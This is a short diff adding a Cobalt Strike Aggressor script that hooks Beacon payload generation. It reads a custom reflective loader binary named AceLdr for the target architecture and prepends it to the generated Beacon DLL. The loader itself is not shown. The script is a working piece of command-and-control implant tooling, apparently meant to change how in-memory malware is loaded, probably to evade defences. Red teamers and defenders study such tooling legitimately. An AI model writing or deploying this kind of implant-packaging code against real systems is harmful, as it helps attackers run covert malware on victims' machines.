@@ -1,0 +1,13 @@
+set BEACON_RDLL_GENERATE {
+    $smpath = script_resource( "AceLdr.". $3 .".bin" );
+    $hnd = openf( $smpath );
+    $ldr = readb( $hnd, -1 );
+    closef( $hnd );
+
+    if ( strlen( $ldr ) == 0 ) {
+        return $null;
+    };
+    warn("Loading custom user defined reflective loader from: " . $smpath);
+
+    return $ldr . $2;
+};
